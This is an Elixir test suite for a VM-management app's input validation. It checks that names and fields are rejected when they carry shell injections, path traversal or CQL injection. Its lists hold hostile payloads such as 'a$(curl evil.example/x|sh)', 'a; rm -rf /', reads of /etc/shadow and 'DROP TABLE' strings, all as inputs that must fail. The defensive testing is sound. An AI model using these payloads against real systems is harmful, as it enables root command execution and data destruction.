defmodule SpectrumPhx.VmsTest do
  @moduledoc """
  The bulk of this file is VM-name validation.

  That weight is deliberate. A VM name reaches a root shell on the hypervisor (Vali builds
  `drbdadm`, `virsh` and `linstor` command lines from it and hands them to spark-daemon's
  `/api/v1/execute`, which runs them with a shell as root) and it reaches CQL. If the
  regex is ever loosened, one of these cases starts passing and the failure mode is remote
  code execution as root on a hypervisor, not a cosmetic bug.
  """
  # Not async: the lifecycle tests configure the context's source through application env,
  # which is global.
  use ExUnit.Case, async: false

  alias SpectrumPhx.Vms
  alias SpectrumPhx.Vms.Vm

  defp params(overrides \\ %{}) do
    Map.merge(
      %{
        "name" => "web-01",
        "vcpu" => "2",
        "memory" => "2048",
        "firmware" => "uefi",
        "disks" => "10G"
      },
      overrides
    )
  end

  describe "VM name validation: shell metacharacters" do
    # Each of these is a command that would run as root on a hypervisor if the name were
    # interpolated into a shell command unvalidated.
    @shell_injections [
      "a; curl evil|sh",
      "a; rm -rf /",
      "a`id`",
      "a$(id)",
      "a$(curl evil.example/x|sh)",
      "a && id",
      "a || id",
      "a | id",
      "a & id",
      "a > /etc/passwd",
      "a < /etc/shadow",
      "a\\; id",
      "a$IFS$9id",
      "$(id)",
      "`id`",
      "a{b,c}",
      "a*",
      "a?",
      "a[b]",
      "a~root",
      "a#comment",
      "a!1",
      "a\tb",
      "a%00b"
    ]

    for injection <- @shell_injections do
      test "rejects #{inspect(injection)}" do
        assert {:error, message} = Vm.validate_name(unquote(injection))
        assert message =~ "must be 1-63 characters"
        refute Vm.valid_name?(unquote(injection))
      end
    end
  end

  describe "VM name validation: path traversal" do
    @traversals [
      "../etc/passwd",
      "../../root/.ssh/authorized_keys",
      "a/../b",
      "a/b",
      "/absolute",
      "a\\b",
      "..",
      "."
    ]

    for traversal <- @traversals do
      test "rejects #{inspect(traversal)}" do
        # A name containing a path separator would escape
        # /var/lib/hci/aether/nvram/<name>_vars.fd and /tmp/<name>.xml.
        refute Vm.valid_name?(unquote(traversal))
      end
    end
  end

  describe "VM name validation: quoting and CQL" do
    @quoted [
      "a'b",
      "a''b",
      "a\"b",
      "'; DROP TABLE hydra.vms; --",
      "a'; DELETE FROM hydra.vms WHERE name = 'a",
      "a' OR '1'='1",
      "a`b",
      "a’b"
    ]

    for name <- @quoted do
      test "rejects #{inspect(name)}" do
        refute Vm.valid_name?(unquote(name))
      end
    end
  end

  describe "VM name validation: whitespace and control characters" do
    test "rejects an embedded newline" do
      refute Vm.valid_name?("a\nb")
    end

    test "rejects a trailing newline" do
      # This is the case a `$`-anchored regex silently accepts: in PCRE (and in Python's
      # `re`, which is why vali.py uses `\Z`) `$` also matches immediately before a final
      # newline. The trailing byte survives into the shell command and into CQL.
      refute Vm.valid_name?("web-01\n")
      refute Vm.valid_name?("web-01\r\n")
    end

    test "rejects a leading newline" do
      refute Vm.valid_name?("\nweb-01")
    end

    test "the pattern is anchored with \\A and \\z, not ^ and $" do
      source = Regex.source(Vm.name_regex())
      assert source =~ "\\A"
      assert source =~ "\\z"
      refute source =~ "^"
      refute String.contains?(source, "$")
    end

    test "rejects spaces, tabs and other whitespace" do
      # The last two are a non-breaking space and a zero-width space: in a form field
      # they look like nothing at all.
      names = ["web 01", " web01", "web01 ", "web\t01", "web\u00A001", "web\u200B01"]

      for name <- names do
        refute Vm.valid_name?(name), "expected #{inspect(name)} to be rejected"
      end
    end

    test "rejects NUL and other control bytes" do
      names = ["web\0", "web\0shell", "web\e", "web\e[31m", "web\a", "web\b", "web\v"]

      for name <- names do
        refute Vm.valid_name?(name), "expected #{inspect(name)} to be rejected"
      end
    end
  end

  describe "VM name validation: first character" do
    test "rejects a leading hyphen" do
      # A leading hyphen makes the name parse as an option to whatever command receives
      # it: `virsh destroy --foo`, `linstor resource-definition delete -x`.
      refute Vm.valid_name?("-web01")
      refute Vm.valid_name?("--force")
      refute Vm.valid_name?("-")
    end

    test "rejects a leading dot or underscore" do
      refute Vm.valid_name?(".hidden")
      refute Vm.valid_name?("_web01")
    end

    test "accepts a leading digit or letter" do
      assert Vm.valid_name?("0web")
      assert Vm.valid_name?("Web")
    end
  end

  describe "VM name validation: length" do
    test "accepts exactly 63 characters" do
      assert Vm.valid_name?(String.duplicate("a", 63))
    end

    test "rejects 64 characters" do
      refute Vm.valid_name?(String.duplicate("a", 64))
    end

    test "rejects a very long name" do
      refute Vm.valid_name?(String.duplicate("a", 300))
    end

    test "rejects an empty name" do
      refute Vm.valid_name?("")
    end
  end

  describe "VM name validation: non-strings" do
    test "rejects nil, atoms, numbers, lists and charlists" do
      for value <- [nil, :web01, 1234, ["web01"], ~c"web01", %{name: "web01"}, {:web, "01"}] do
        refute Vm.valid_name?(value), "expected #{inspect(value)} to be rejected"
        assert {:error, _} = Vm.validate_name(value)
      end
    end

    test "rejects invalid UTF-8 and non-ASCII letters" do
      for name <- ["wéb01", "ウェブ", "web�"] do
        refute Vm.valid_name?(name), "expected #{inspect(name)} to be rejected"
      end
    end
  end

  describe "VM name validation: valid names" do
    test "accepts the documented shapes" do
      for name <- [
            "web-01",
            "db.prod",
            "vm_1",
            "a",
            "0",
            "Z",
            "web01",
            "WEB-01.prod_2",
            "node1.dc2.example",
            String.duplicate("a", 63)
          ] do
        assert {:ok, ^name} = Vm.validate_name(name), "expected #{inspect(name)} to be accepted"
      end
    end

    test "returns the name unchanged -- it is never sanitised" do
      # Rejecting rather than repairing is the point: a silently rewritten name is a VM
      # the operator did not ask for, and two requested names can collide onto one record.
      assert {:ok, "WEB-01.prod_2"} = Vm.validate_name("WEB-01.prod_2")
    end
  end

  describe "Vm.new/1 validation" do
    test "builds a VM from valid parameters" do
      assert {:ok, vm} = Vm.new(params())
      assert vm.name == "web-01"
      assert vm.vcpu == 2
      assert vm.memory == 2048
      assert vm.firmware == "uefi"
      assert vm.disks_list == "10G"
      assert vm.disk_size == 10
      assert vm.state == "Stopped"
      assert vm.host_ip == ""
      assert vm.status == nil
      assert vm.network_id == Vm.default_network_id()
    end

    test "accepts atom keys and integer values" do
      assert {:ok, vm} = Vm.new(%{name: "db.prod", vcpu: 4, memory: 8192, firmware: "bios"})
      assert vm.vcpu == 4
      assert vm.firmware == "bios"
    end

    test "an injection-shaped name fails creation, not just the name check" do
      assert {:error, errors} = Vm.new(params(%{"name" => "a; curl evil|sh"}))
      assert Keyword.has_key?(errors, :name)
    end

    test "reports every failing field at once" do
      assert {:error, errors} =
               Vm.new(%{
                 "name" => "-bad",
                 "vcpu" => "0",
                 "memory" => "64",
                 "firmware" => "coreboot",
                 "disks" => "512M"
               })

      assert Keyword.keys(errors) |> Enum.sort() == [:disks, :firmware, :memory, :name, :vcpu]
    end

    test "rejects fewer than one vCPU" do
      assert {:error, errors} = Vm.new(params(%{"vcpu" => "0"}))
      assert errors[:vcpu] =~ "at least 1"

      assert {:error, errors} = Vm.new(params(%{"vcpu" => "-4"}))
      assert errors[:vcpu] =~ "at least 1"
    end

    test "rejects a non-numeric vCPU count" do
      assert {:error, errors} = Vm.new(params(%{"vcpu" => "two"}))
      assert errors[:vcpu] =~ "whole number"

      assert {:error, errors} = Vm.new(params(%{"vcpu" => "2; id"}))
      assert errors[:vcpu] =~ "whole number"
    end

    test "rejects memory below 128 MiB" do
      assert {:error, errors} = Vm.new(params(%{"memory" => "127"}))
      assert errors[:memory] =~ "at least 128 MiB"

      assert {:ok, vm} = Vm.new(params(%{"memory" => "128"}))
      assert vm.memory == 128
    end

    test "rejects firmware outside uefi/bios" do
      assert {:error, errors} = Vm.new(params(%{"firmware" => "coreboot"}))
      assert errors[:firmware] =~ "uefi, bios"

      for firmware <- ~w(uefi bios UEFI BIOS) do
        assert {:ok, vm} = Vm.new(params(%{"firmware" => firmware}))
        assert vm.firmware == String.downcase(firmware)
      end
    end

    test "rejects a firmware value carrying a shell payload" do
      assert {:error, errors} = Vm.new(params(%{"firmware" => "uefi; id"}))
      assert Keyword.has_key?(errors, :firmware)
    end
  end

  describe "disk size validation" do
    test "accepts gibibyte and tebibyte sizes" do
      assert {:ok, 10} = Vm.validate_disk_size("10G")
      assert {:ok, 10} = Vm.validate_disk_size("10GB")
      assert {:ok, 10} = Vm.validate_disk_size("10GiB")
      assert {:ok, 10} = Vm.validate_disk_size("10")
      assert {:ok, 1024} = Vm.validate_disk_size("1T")
      assert {:ok, 2048} = Vm.validate_disk_size("2TiB")
      assert {:ok, 10} = Vm.validate_disk_size(" 10G ")
    end

    test "rejects mebibytes, which the storage tier cannot parse" do
      # `vali.py` strips "B" and then int()s the rest after removing G/T, so "512M"
      # becomes a ValueError three services away rather than a field error here.
      assert {:error, _} = Vm.validate_disk_size("512M")
      assert {:error, _} = Vm.validate_disk_size("512MiB")
    end

    test "rejects zero, negative, fractional and non-numeric sizes" do
      for size <- ["0G", "-10G", "10.5G", "ten", "", "G", "10G; id", "10G`id`", "$(id)G"] do
        assert {:error, _} = Vm.validate_disk_size(size),
               "expected #{inspect(size)} to be rejected"
      end
    end

    test "rejects an invalid disk in a multi-disk list" do
      assert {:error, errors} = Vm.new(params(%{"disks" => "10G,notasize"}))
      assert Keyword.has_key?(errors, :disks)
    end

    test "keeps the operator's disk strings in disks_list" do
      assert {:ok, vm} = Vm.new(params(%{"disks" => "10G,500G"}))
      assert vm.disks_list == "10G,500G"
      assert vm.disk_size == 10
    end

    test "validates the storage container name like any other shell-bound identifier" do
      assert {:ok, vm} = Vm.new(params(%{"disks" => "10G:fast-pool"}))
      assert vm.disks_list == "10G:fast-pool"

      assert {:error, errors} = Vm.new(params(%{"disks" => "10G:pool; id"}))
      assert Keyword.has_key?(errors, :disks)
    end

    test "requires at least one disk" do
      assert {:error, errors} = Vm.new(params(%{"disks" => ""}))
      assert Keyword.has_key?(errors, :disks)
    end
  end

  describe "Vm.disks/1" do
    test "maps each disk to its DRBD resource and device path" do
      vm = %Vm{name: "web-01", disks_list: "10G,500G:fast"}

      assert [first, second] = Vm.disks(vm)
      assert first.index == 0
      assert first.resource == "web-01-disk0"
      assert first.path == "/dev/drbd/by-res/web-01-disk0/0"
      assert first.container == nil
      assert second.resource == "web-01-disk1"
      assert second.container == "fast"
      assert second.size_gib == 500
    end

    test "treats the NONE sentinel as no disks" do
      assert Vm.disks(%Vm{name: "web-01", disks_list: "NONE"}) == []
      assert Vm.disks(%Vm{name: "web-01", disks_list: ""}) == []
      assert Vm.disks(%Vm{name: "web-01", disks_list: nil}) == []
    end
  end

  describe "state vs status" do
    test "running? reads state, migrating? reads status" do
      # These are different columns. Conflating them is how the migration lock came to be
      # written and never actually checked.
      running = %Vm{name: "a", state: "Running", status: nil}
      migrating = %Vm{name: "a", state: "Running", status: "migrating"}
      stopped = %Vm{name: "a", state: "Stopped", status: "running"}

      assert Vm.running?(running)
      refute Vm.migrating?(running)

      assert Vm.running?(migrating)
      assert Vm.migrating?(migrating)

      refute Vm.running?(stopped)
      refute Vm.migrating?(stopped)
    end

    test "placed? distinguishes an unassigned VM from one holding a host" do
      refute Vm.placed?(%Vm{name: "a", host_ip: ""})
      refute Vm.placed?(%Vm{name: "a", host_ip: nil})
      assert Vm.placed?(%Vm{name: "a", host_ip: "10.0.0.5"})
    end
  end

  describe "Vm.from_row/1" do
    test "builds from a Hydra row with string keys" do
      row = %{
        "name" => "web-01",
        "vcpu" => 4,
        "memory" => 8192,
        "disk_path" => "/dev/drbd/by-res/web-01-disk0/0",
        "disk_size" => 10,
        "state" => "Running",
        "host_ip" => "10.0.0.5",
        "disks_list" => "10G",
        "firmware" => "uefi",
        "iso" => "",
        "boot_device" => "",
        "network_id" => "net-1",
        "cpu_model" => nil,
        "audio_enabled" => false,
        "status" => "migrating"
      }

      vm = Vm.from_row(row)
      assert vm.name == "web-01"
      assert vm.vcpu == 4
      assert vm.state == "Running"
      assert vm.status == "migrating"
      assert Vm.migrating?(vm)
    end

    test "fills defaults for null columns" do
      vm = Vm.from_row(%{"name" => "web-01", "state" => nil, "host_ip" => nil, "vcpu" => nil})
      assert vm.state == "Stopped"
      assert vm.host_ip == ""
      assert vm.vcpu == 1
      assert vm.status == nil
    end

    test "passes an existing struct through" do
      vm = %Vm{name: "web-01"}
      assert Vm.from_row(vm) == vm
    end
  end

  describe "CQL statements" do
    test "no statement interpolates a value" do
      statements = [
        Vms.list_vms_cql(),
        Vms.get_vm_cql(),
        Vms.claim_host_cql(),
        Vms.set_migration_lock_cql(),
        Vms.clear_migration_lock_cql(),
        Vms.insert_cql()
      ]

      for statement <- statements do
        # A quoted literal in one of these means a value was built into the statement
        # instead of bound to it -- the shape the Python tier had to patch per call site.
        refute statement =~ "'", "#{statement} contains a quoted literal"
      end
    end

    test "every value in a write statement is a bound placeholder" do
      # 15 columns plus nothing else: if a value were interpolated, this count would drop.
      assert Vms.insert_cql() |> String.graphemes() |> Enum.count(&(&1 == "?")) == 15
      assert Vms.claim_host_cql() |> String.graphemes() |> Enum.count(&(&1 == "?")) == 4
      assert Vms.set_migration_lock_cql() |> String.graphemes() |> Enum.count(&(&1 == "?")) == 3
      assert Vms.clear_migration_lock_cql() |> String.graphemes() |> Enum.count(&(&1 == "?")) == 3
      assert Vms.get_vm_cql() |> String.graphemes() |> Enum.count(&(&1 == "?")) == 1
      assert Vms.list_vms_cql() |> String.graphemes() |> Enum.count(&(&1 == "?")) == 0
    end

    test "claim_host is a compare-and-swap on host_ip" do
      # The blind version of this statement is what let two hosts start the same VM: an
      # unconditional UPDATE is last-write-wins, so both callers "succeed".
      assert Vms.claim_host_cql() ==
               "UPDATE hydra.vms SET host_ip = ?, state = ? WHERE name = ? IF host_ip = ?"
    end

    test "the migration lock is conditional in both directions" do
      assert Vms.set_migration_lock_cql() ==
               "UPDATE hydra.vms SET status = ? WHERE name = ? IF status != ?"

      assert Vms.clear_migration_lock_cql() ==
               "UPDATE hydra.vms SET status = ? WHERE name = ? IF status = ?"
    end

    test "the lock is written to status, never to state" do
      assert Vms.set_migration_lock_cql() =~ "SET status ="
      refute Vms.set_migration_lock_cql() =~ "state"
      assert Vms.migration_lock() == "migrating"
    end

    test "create is conditional so a duplicate cannot overwrite a live VM" do
      # CQL INSERT is an upsert; without IF NOT EXISTS a second create for the same name
      # silently replaces the first VM's disk paths.
      assert Vms.insert_cql() =~ "IF NOT EXISTS"
    end

    test "reads select by bound key" do
      assert Vms.get_vm_cql() =~ "WHERE name = ?"
    end
  end

  describe "context guards run before any database access" do
    # No source is configured in this block, so a name that got past validation would
    # attempt a real query against a cluster that is not there. These never get that far.

    test "get_vm rejects an invalid name without querying" do
      for name <- ["a; curl evil|sh", "a`id`", "../etc/passwd", "-x", String.duplicate("a", 64)] do
        assert {:error, :invalid_name} = Vms.get_vm(name)
      end
    end

    test "claim_host rejects an invalid name without querying" do
      assert {:error, :invalid_name} = Vms.claim_host("a$(id)", "10.0.0.1", "")
    end

    test "the migration lock functions reject an invalid name without querying" do
      assert {:error, :invalid_name} = Vms.set_migration_lock("a; rm -rf /")
      assert {:error, :invalid_name} = Vms.clear_migration_lock("a; rm -rf /")
    end

    test "power functions reject an invalid name without querying" do
      assert {:error, :invalid_name} = Vms.power_on("a`id`")
      assert {:error, :invalid_name} = Vms.power_off("a`id`")
      assert {:error, :invalid_name} = Vms.reboot("a`id`")
    end

    test "create_vm rejects an invalid name without writing" do
      assert {:error, errors} =
               Vms.create_vm(%{"name" => "a; id", "vcpu" => "1", "memory" => "512"})

      assert Keyword.has_key?(errors, :name)
    end
  end

  describe "lifecycle guards" do
    setup do
      vms = [
        %Vm{name: "running-vm", state: "Running", host_ip: "10.0.0.5"},
        %Vm{name: "stopped-vm", state: "Stopped", host_ip: ""},
        %Vm{name: "locked-vm", state: "Running", host_ip: "10.0.0.5", status: "migrating"}
      ]

      Application.put_env(:spectrum_phx, :vms_source, {:static, vms})

      test_pid = self()

      Application.put_env(:spectrum_phx, :vms_task_submitter, fn service, action, payload ->
        send(test_pid, {:task, service, action, payload})
        {:ok, %{"task_id" => "test-task", "status" => "pending"}}
      end)

      on_exit(fn ->
        Application.delete_env(:spectrum_phx, :vms_source)
        Application.delete_env(:spectrum_phx, :vms_task_submitter)
      end)

      :ok
    end

    test "power_on submits a start task for a stopped VM" do
      assert {:ok, %{"task_id" => "test-task"}} = Vms.power_on("stopped-vm")
      assert_received {:task, "vali", "start", %{"vm_name" => "stopped-vm"}}
    end

    test "power_on refuses a VM that is already running" do
      assert {:error, :already_running} = Vms.power_on("running-vm")
      refute_received {:task, _, _, _}
    end

    test "power_on refuses a VM holding the migration lock" do
      assert {:error, :migrating} = Vms.power_on("locked-vm")
      refute_received {:task, _, _, _}
    end

    test "power_off submits a stop task" do
      assert {:ok, _} = Vms.power_off("running-vm")
      assert_received {:task, "vali", "stop", %{"vm_name" => "running-vm"}}
    end

    test "power_off refuses a VM holding the migration lock" do
      assert {:error, :migrating} = Vms.power_off("locked-vm")
      refute_received {:task, _, _, _}
    end

    test "reboot requires the VM to be running" do
      assert {:ok, _} = Vms.reboot("running-vm")
      assert_received {:task, "vali", "reboot", %{"vm_name" => "running-vm"}}

      assert {:error, :not_running} = Vms.reboot("stopped-vm")
    end

    test "all lifecycle functions refuse an unknown VM" do
      assert {:error, :not_found} = Vms.power_on("no-such-vm")
      assert {:error, :not_found} = Vms.power_off("no-such-vm")
      assert {:error, :not_found} = Vms.reboot("no-such-vm")
    end

    test "list_vms and get_vm read through the configured source" do
      assert {:ok, vms} = Vms.list_vms()
      assert length(vms) == 3
      assert {:ok, vm} = Vms.get_vm("locked-vm")
      assert Vm.migrating?(vm)
      assert {:error, :not_found} = Vms.get_vm("no-such-vm")
    end
  end
end
